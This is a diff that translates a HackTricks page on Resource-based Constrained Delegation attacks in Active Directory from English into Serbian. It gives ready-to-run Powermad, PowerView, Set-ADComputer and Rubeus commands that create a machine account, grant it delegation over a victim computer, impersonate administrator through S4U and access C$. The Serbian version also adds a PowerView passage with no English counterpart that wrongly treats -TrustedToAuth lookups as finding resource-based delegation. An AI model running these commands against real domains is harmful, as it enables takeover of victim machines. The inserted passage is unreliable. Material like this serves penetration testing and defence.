@@ -1,60 +1,57 @@
-# Resource-based Constrained Delegation
+# Resursno ograničeno preusmeravanje
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
-## Basics of Resource-based Constrained Delegation
+## Osnove resursno ograničenog preusmeravanja
 
-This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a service**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.
+Ovo je slično osnovnom [Ograničenom preusmeravanju](constrained-delegation.md) ali **umesto** davanja dozvola **objektu** da **impersonira bilo kog korisnika protiv servisa**. Resursno ograničeno preusmeravanje **postavlja** u **objektu ko može impersonirati bilo kog korisnika protiv njega**.
 
-In this case, the constrained object will have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate any other user against it.
+U ovom slučaju, ograničeni objekat će imati atribut nazvan _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ sa imenom korisnika koji može impersonirati bilo kog drugog korisnika protiv njega.
 
-Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) can set the _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (In the other forms of Delegation you needed domain admin privs).
+Još jedna važna razlika između ovog ograničenog preusmeravanja i drugih preusmeravanja je da bilo koji korisnik sa **dozvolama za pisanje nad računom mašine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) može postaviti _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (u drugim oblicima preusmeravanja bili su vam potrebni privilegije domenskog administratora).
 
-### New Concepts
+### Novi koncepti
 
-Back in Constrained Delegation it was told that the **`TrustedToAuthForDelegation`** flag inside the _userAccountControl_ value of the user is needed to perform a **S4U2Self.** But that's not completely truth.\
-The reality is that even without that value, you can perform a **S4U2Self** against any user if you are a **service** (have a SPN) but, if you **have `TrustedToAuthForDelegation`** the returned TGS will be **Forwardable** and if you **don't have** that flag the returned TGS **won't** be **Forwardable**.
+U ograničenom preusmeravanju je rečeno da je potrebna oznaka **`TrustedToAuthForDelegation`** unutar vrednosti _userAccountControl_ korisnika da bi se izvršio **S4U2Self**. Ali to nije potpuno tačno.\
+Realnost je da čak i bez te vrednosti, možete izvršiti **S4U2Self** protiv bilo kog korisnika ako ste **servis** (imate SPN), ali ako **imate `TrustedToAuthForDelegation`** vraćeni TGS će biti **Forwardable**, a ako **nemate** tu oznaku vraćeni TGS **neće** biti **Forwardable**.
 
-However, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable** trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based constrain delegation, it will work** (this is not a vulnerability, it's a feature, apparently).
+Međutim, ako je **TGS** korišćen u **S4U2Proxy** **NE Forwardable**, pokušaj zloupotrebe **osnovnog ograničenog preusmeravanja** **neće uspeti**. Ali ako pokušavate da iskoristite **resursno ograničeno preusmeravanje, uspeće** (ovo nije ranjivost, već funkcionalnost, izgleda).
 
-### Attack structure
+### Struktura napada
 
-> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.
+> Ako imate **ekvivalentne privilegije za pisanje** nad **računom računara**, možete dobiti **privilegovan pristup** toj mašini.
 
-Suppose that the attacker has already **write equivalent privileges over the victim computer**.
+Pretpostavimo da napadač već ima **ekvivalentne privilegije za pisanje nad računarom žrtve**.
 
-1. The attacker **compromises** an account that has a **SPN** or **creates one** (“Service A”). Note that **any** _Admin User_ without any other special privilege can **create** up until 10 **Computer objects (**_**MachineAccountQuota**_**)** and set them a **SPN**. So the attacker can just create a Computer object and set a SPN.
-2. The attacker **abuses its WRITE privilege** over the victim computer (ServiceB) to configure **resource-based constrained delegation to allow ServiceA to impersonate any user** against that victim computer (ServiceB).
-3. The attacker uses Rubeus to perform a **full S4U attack** (S4U2Self and S4U2Proxy) from Service A to Service B for a user **with privileged access to Service B**.
-   1. S4U2Self (from the SPN compromised/created account): Ask for a **TGS of Administrator to me** (Not Forwardable).
-   2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from **Administrator** to the **victim host**.
-   3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based constrained delegation, it will work.
-4. The attacker can **pass-the-ticket** and **impersonate** the user to gain **access to the victim ServiceB**.
+1. Napadač **kompromituje** nalog koji ima **SPN** ili **kreira jedan** ("Servis A"). Imajte na umu da **bilo koji** _Admin korisnik_ bez bilo kakvih drugih posebnih privilegija može **kreirati** do 10 **objekata računara (**_**MachineAccountQuota**_**)** i postaviti im SPN. Dakle, napadač može jednostavno kreirati objekat računara i postaviti SPN.
+2. Napadač **zloupotrebljava svoje privilegije ZA PISANJE** nad računarom žrtve (ServisB) da konfiguriše **resursno ograničeno preusmeravanje kako bi dozvolio ServisuA da impersonira bilo kog korisnika** protiv tog računara žrtve (ServisB).
+3. Napadač koristi Rubeus da izvrši **potpuni S4U napad** (S4U2Self i S4U2Proxy) od Servisa A do Servisa B za korisnika **sa privilegovanim pristupom Servisu B**.
+1. S4U2Self (iz kompromitovanog/kreiranog naloga sa SPN-om): Zahtevaj **TGS Administratora meni** (Nije Forwardable).
+2. S4U2Proxy: Koristi **TGS koji nije Forwardable** iz prethodnog koraka da zahteva **TGS** od **Administratora** do **računara žrtve**.
+3. Čak i ako koristite TGS koji nije Forwardable, pošto iskorišćavate resursno ograničeno preusmeravanje, uspeće.
+4. Napadač može **proslediti kartu** i **impersonirati** korisnika da bi dobio **pristup žrtvenom ServisuB**.
 
-To check the _**MachineAccountQuota**_ of the domain you can use:
-
+Da biste proverili _**MachineAccountQuota**_ domena, možete koristiti:
 ```powershell
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
+## Napad
 
-## Attack
+### Kreiranje objekta računara
 
-### Creating a Computer Object
-
-You can create a computer object inside the domain using [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
-
+Možete kreirati objekat računara unutar domena koristeći [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
 ```powershell
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -62,18 +59,50 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
+### Konfigurisanje ograničene delegacije zasnovane na resursima
 
-### Configuring R**esource-based Constrained Delegation**
-
-**Using activedirectory PowerShell module**
-
+**Korišćenje activedirectory PowerShell modula**
 ```powershell
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
+**Korišćenje powerview-a**
 
-**Using powerview**
+Powerview je moćan alat za manipulaciju i istraživanje Active Directory okruženja. Može se koristiti za izvršavanje različitih zadataka, uključujući i manipulaciju ograničenjima delegacije resursa.
 
+Da biste koristili powerview, prvo ga morate učitati u PowerShell sesiju. To možete učiniti pomoću sledeće komande:
+
+```powershell
+. .\PowerView.ps1
+```
+
+Nakon što je powerview učitan, možete koristiti različite funkcije za manipulaciju ograničenjima delegacije resursa. Na primer, možete koristiti funkciju `Get-DomainUser` da biste dobili informacije o korisnicima u domenu:
+
+```powershell
+Get-DomainUser
+```
+
+Ova funkcija će vam prikazati listu korisnika u domenu, zajedno sa njihovim atributima kao što su ime, korisničko ime, SID itd.
+
+Da biste pronašli korisnike koji imaju omogućenu delegaciju resursa, možete koristiti funkciju `Get-DomainUser -TrustedToAuth`:
+
+```powershell
+Get-DomainUser -TrustedToAuth
+```
+
+Ova funkcija će vam prikazati listu korisnika koji su omogućili delegaciju resursa, zajedno sa informacijama o tome kojim računima su poverili autentifikaciju.
+
+Kada pronađete korisnika sa omogućenom delegacijom resursa, možete koristiti funkciju `Get-DomainObjectAcl` da biste dobili informacije o dozvolama za određeni objekat u domenu:
+
+```powershell
+Get-DomainObjectAcl -Identity "CN=Computer1,OU=Computers,DC=example,DC=com"
+```
+
+Ova funkcija će vam prikazati listu dozvola za određeni objekat, uključujući i informacije o tome ko ima pristup objektu.
+
+Powerview takođe pruža funkcije za manipulaciju ograničenjima delegacije resursa, kao što su `Add-DomainObjectAcl` i `Set-DomainObjectAcl`. Ove funkcije vam omogućavaju da dodate ili promenite dozvole za određeni objekat u domenu.
+
+Korišćenje powerview-a može biti veoma korisno za istraživanje i manipulaciju ograničenjima delegacije resursa u Active Directory okruženju.
 ```powershell
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -88,56 +117,47 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
+### Izvođenje potpunog S4U napada
 
-### Performing a complete S4U attack
-
-First of all, we created the new Computer object with the password `123456`, so we need the hash of that password:
-
+Prvo, kreirali smo novi objekat računara sa lozinkom `123456`, pa nam je potreban heš te lozinke:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-
-This will print the RC4 and AES hashes for that account.\
-Now, the attack can be performed:
-
+Ovo će ispisati RC4 i AES heševe za taj nalog.\
+Sada se može izvršiti napad:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-
-You can generate more tickets just asking once using the `/altservice` param of Rubeus:
-
+Možete generisati više karata tako što ćete samo jednom koristiti parametar `/altservice` u Rubeus-u:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
-
 {% hint style="danger" %}
-Note that users has an attribute called "**Cannot be delegated**". If a user has this attribute to True, you won't be able to impersonate him . This property can be seen inside bloodhound.
+Napomena da korisnici imaju atribut koji se zove "**Ne može biti delegiran**". Ako korisnik ima ovaj atribut postavljen na True, nećete moći da se predstavljate kao taj korisnik. Ova osobina se može videti u Bloodhound-u.
 {% endhint %}
 
-### Accessing
+### Pristupanje
 
-The last command line will perform the **complete S4U attack and will inject the TGS** from Administrator to the victim host in **memory**.\
-In this example it was requested a TGS for the **CIFS** service from Administrator, so you will be able to access **C$**:
-
+Poslednja komanda će izvršiti **potpuni S4U napad i ubaciti TGS** od Administratora na ciljni računar u **memoriju**.\
+U ovom primeru je zatražen TGS za uslugu **CIFS** od Administratora, tako da ćete moći da pristupite **C$**.
 ```bash
 ls \\victim.domain.local\C$
 ```
+### Zloupotreba različitih uslužnih karata
 
-### Abuse different service tickets
+Saznajte o [**dostupnim uslužnim kartama ovde**](silver-ticket.md#dostupne-usluge).
 
-Lear about the [**available service tickets here**](silver-ticket.md#available-services).
+## Greške u Kerberosu
 
-## Kerberos Errors
+* **`KDC_ERR_ETYPE_NOTSUPP`**: Ovo znači da je Kerberos konfigurisan da ne koristi DES ili RC4, a vi dostavljate samo RC4 heš. Rubeusu dostavite barem AES256 heš (ili samo dostavite RC4, AES128 i AES256 hešove). Primer: `[Rubeus.Program]::MainString("s4u /user:LAZNOIMEKOMPJUTERA /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+* **`KRB_AP_ERR_SKEW`**: Ovo znači da je vreme trenutnog računara različito od vremena DC-a i Kerberos ne radi pravilno.
+* **`preauth_failed`**: Ovo znači da dati korisničko ime + heševi ne funkcionišu za prijavljivanje. Možda ste zaboravili da stavite "$" unutar korisničkog imena prilikom generisanja heševa (`.\Rubeus.exe hash /password:123456 /user:LAZNOIMEKOMPJUTERA$ /domain:domain.local`)
+* **`KDC_ERR_BADOPTION`**: Ovo može značiti:
+* Korisnik kog pokušavate da oponašate ne može pristupiti željenoj usluzi (jer je ne možete oponašati ili nema dovoljno privilegija)
+* Tražena usluga ne postoji (ako tražite kartu za winrm, ali winrm nije pokrenut)
+* Kreirani lažni računar je izgubio privilegije nad ranjivim serverom i morate ih vratiti.
 
-* **`KDC_ERR_ETYPE_NOTSUPP`**: This means that kerberos is configured to not use DES or RC4 and you are supplying just the RC4 hash. Supply to Rubeus at least the AES256 hash (or just supply it the rc4, aes128 and aes256 hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-* **`KRB_AP_ERR_SKEW`**: This means that the time of the current computer is different from the one of the DC and kerberos is not working properly.
-* **`preauth_failed`**: This means that the given username + hashes aren't working to login. You may have forgotten to put the "$" inside the username when generating the hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
-* **`KDC_ERR_BADOPTION`**: This may mean:
-  * The user you are trying to impersonate cannot access the desired service (because you cannot impersonate it or because it doesn't have enough privileges)
-  * The asked service doesn't exist (if you ask for a ticket for winrm but winrm isn't running)
-  * The fakecomputer created has lost it's privileges over the vulnerable server and you need to given them back.
-
-## References
+## Reference
 
 * [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 * [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
@@ -146,14 +166,14 @@ Lear about the [**available service tickets here**](silver-ticket.md#available-s
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
